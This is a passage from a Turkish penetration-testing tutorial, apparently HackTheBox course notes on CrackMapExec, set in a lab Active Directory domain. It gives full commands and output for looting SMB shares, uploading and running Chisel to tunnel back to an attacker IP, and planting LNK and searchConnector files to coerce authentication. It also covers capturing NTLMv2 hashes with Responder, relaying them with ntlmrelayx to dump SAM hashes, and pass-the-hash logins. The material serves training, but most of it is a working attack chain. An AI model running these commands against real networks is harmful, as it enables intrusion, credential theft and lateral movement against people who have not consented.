      "mtime_epoch": "2022-10-11 11:44:14",
      "size": "52 Bytes"
    },
    "information-txt.csv": {
      "atime_epoch": "2022-10-31 15:00:58",
      "ctime_epoch": "2022-10-31 14:21:36",
      "mtime_epoch": "2022-10-31 15:00:58",
      "size": "284 Bytes"
    }
  }
}

```

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
plus with option:
SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
['ipc

```
ls -R /tmp/cme_spider_plus/10.129.203.121/
/tmp/cme_spider_plus/10.129.203.121/:
IT linux01

/tmp/cme_spider_plus/10.129.203.121/IT:
Creds.txt Documents IPlist.txt
...SNIP...

/tmp/cme_spider_plus/10.129.203.121/linux01:
flag.txt information-txt.csv
```

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

```
crackmapexec smb -M spider_plus --options

[*] spider_plus module options:
 READ_ONLY Only list files and put the name into a
JSON (default: True)
 EXCLUDE_EXTS Extension file to exclude (Default:
ico,lnk)
 EXCLUDE_DIR Directory to exclude (Default: print$)
 MAX_FILE_SIZE Max file size allowed to dump (Default:
51200)
 OUTPUT_FOLDER Path of the remote folder where the dump
will occur (Default: /tmp/cme_spider_plus)

```

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

```
wget
https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_l
inux_amd64.gz -O chisel.gz -q

gunzip -d chisel.gz

chmod +x chisel

./chisel server --reverse

2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint
CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

```
wget
https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_w
indows_amd64.gz -O chisel.exe.gz -q

gunzip -d chisel.exe.gz

crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file
./chisel.exe \\Windows\\Temp\\chisel.exe

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [*] Copy ./chisel.exe
to \Windows\Temp\chisel.exe
SMB 10.129.204.133 445 MS01 [+] Created file
./chisel.exe on \\C$\\Windows\Temp\chisel.exe

```


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

```
./chisel server --reverse
<SNIP>
2022/11/06 10:57:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
Listening

```

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

```
netstat -lnpt | grep 1080
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
tcp 0 0 127.0.0.1:1080 0.0.0.0:* LISTEN
446306/./chisel
```

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

```
cat /etc/proxychains.conf
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

```
proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:135 ...
OK
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
SMB 172.16.1.10 445 DC01 C$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 carlos
SMB 172.16.1.10 445 DC01 D$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 david
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
READ,WRITE
SMB 172.16.1.10 445 DC01 john
SMB 172.16.1.10 445 DC01 julio
SMB 172.16.1.10 445 DC01 linux01
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 svc_workstations
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share
```


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
--shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
SMB 172.16.1.10 445 DC01 C$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 carlos
SMB 172.16.1.10 445 DC01 D$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 david
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
READ,WRITE
SMB 172.16.1.10 445 DC01 john
SMB 172.16.1.10 445 DC01 julio
SMB 172.16.1.10 445 DC01 linux01
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 svc_workstations
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share
```

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "StopProcess -Name chisel -Force"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
```

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
"C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 2022/11/07 06:26:10
client: Connecting to ws://10.10.14.33:8080
SMB 10.129.204.133 445 MS01 2022/11/07 06:26:11
client: Connected (Latency 125.6629ms)
```

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

```
./chisel server --reverse
2022/12/08 16:43:17 server: Reverse tunnelling enabled
2022/12/08 16:43:17 server: Fingerprint
NVnBjtu2DPIuQPxLU0YdcyZhRKc+Myi3ojPzo0T2frQ=
2022/12/08 16:43:17 server: Listening on http://0.0.0.0:8080
2022/12/08 16:44:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
Listening
^C

```


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
"C:\Windows\Temp\chisel.exe server --socks5"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

```
sudo chisel client 10.129.204.133:8080 socks
2022/11/22 06:56:01 client: Connecting to ws://10.129.204.133:8080
2022/11/22 06:56:01 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 06:56:02 client: Connected (Latency 124.871246ms)
```

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
<SNIP>

```

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

```
crackmapexec smb -M slinky --options
[*] slinky module options:
 SERVER IP of the SMB server
 NAME LNK file nametest
 CLEANUP Cleanup (choices: True or False)

```

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

```
sudo chisel client 10.129.204.133:8080 socks
2022/11/22 07:15:52 client: Connecting to ws://10.129.204.133:8080
2022/11/22 07:15:52 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 07:15:53 client: Connected (Latency 125.541725ms)

```


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$
Remote Admin
SMB 172.16.1.10 445 DC01 C$
Default share
SMB 172.16.1.10 445 DC01 D$
Default share
SMB 172.16.1.10 445 DC01 flag READ
SMB 172.16.1.10 445 DC01 HR
READ,WRITE
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
SMB 172.16.1.10 445 DC01 IT-Tools
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share

```


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M slinky -o SERVER=10.10.14.33 NAME=important

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: HR
SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
on the HR share
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
on the IT-Tools share
```


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

```
sudo responder -I tun0
 __
 .----.-----.-----.-----.-----.-----.--| |.-----.----.
 | _| -__|__ --| _ | _ | | _ || -__| _|
 |__| |_____|_____| __|_____|__|__|_____||_____|__|
 |__|
 NBT-NS, LLMNR & MDNS Responder 3.0.6.0
 Author: Laurent Gaffie ([email protected])
 To kill this script, hit CTRL-C
<SNIP>
[+] Listening for events...
[SMB] NTLMv2-SSP Client : 10.129.204.133
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
[SMB] NTLMv2-SSP Hash :
julio::INLANEFREIGHT:6ab02caa0926e456:433DB600379844344ED4D3A073CAF995:010
1000000000000004A2BBF8808D901D4CC1FFAB74CC23F00000000020008004400320058005
60001001E00570049004E002D0030005500510058004E00570046004100550030004400040
03400570049004E002D0030005500510058004E005700460041005500300044002E0044003
200580056002E004C004F00430041004C0003001400440<SNIP>
```

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

```
proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt

SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

cat relay.txt
172.16.1.5
```


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry
```

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

```
proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H
30b3783ce2abf1af70f77d0660cf3453 --local-auth

SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 172.16.1.5 445 MS01 [+]
MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
```

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M slinky -o NAME=important CLEANUP=YES

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: HR
SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
on the HR share
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
on the IT-Tools share
```

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

```
crackmapexec smb -M drop-sc --options

[*] drop-sc module options:
 Technique discovered by @DTMSecurity and @domchell to remotely
coerce a host to start WebClient service.
 https://dtm.uk/exploring-search-connectors-and-library-fileson-windows/
 Module by @zblurx
 URL URL in the searchConnector-ms file, default
https://rickroll
 CLEANUP Cleanup (choices: True or False)
 SHARE Specify a share to target
 FILENAME Specify the filename used WITHOUT the extension
searchConnector-ms (it's automatically added); the default is "Documents".
```

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
